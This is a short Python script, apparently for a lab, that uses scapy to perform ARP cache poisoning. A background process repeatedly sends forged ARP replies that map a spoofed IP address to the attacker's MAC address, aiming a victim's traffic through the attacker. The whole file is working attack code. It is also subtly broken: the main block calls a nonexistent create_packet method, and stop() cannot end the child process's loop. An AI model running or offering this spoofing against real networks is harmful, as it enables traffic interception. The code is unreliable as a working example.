from scapy.all import *
import multiprocessing
import time

class ArpPoisoner(multiprocessing.Process):

    def __init__(self, interface):

        multiprocessing.Process.__init__(self)

        self.interface = interface    #enp0s3
        self.packets = []

    def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
        #Initialize packet
        packet = Ether()/ARP()    
        #Set values for the mac and ip addresses
        packet[Ether].src = mac_attacker
        packet[ARP].hwsrc = mac_attacker
        packet[ARP].hwdst = mac_victim
        packet[ARP].psrc  = ip_to_spoof
        packet[ARP].pdst  = ip_victim

        self.packets.append(packet)

    def clear_packets(self):
        self.packets = []

    def run(self):

        self.exit = False

        while not self.exit:
            
            for packet in self.packets:
                sendp(packet, iface = self.interface, verbose=0)
            
            time.sleep(1)

    def stop(self):

        self.exit = True


if __name__ == "__main__":
    
    arp_poisoner = ArpPoisoner("enp0s3")

    arp_poisoner.create_packet("08:00:27:cc:08:6f", "08:00:27:b7:c4:af", "192.168.56.102", "192.168.56.101")

    arp_poisoner.start()
    time.sleep(5)
    arp_poisoner.stop()
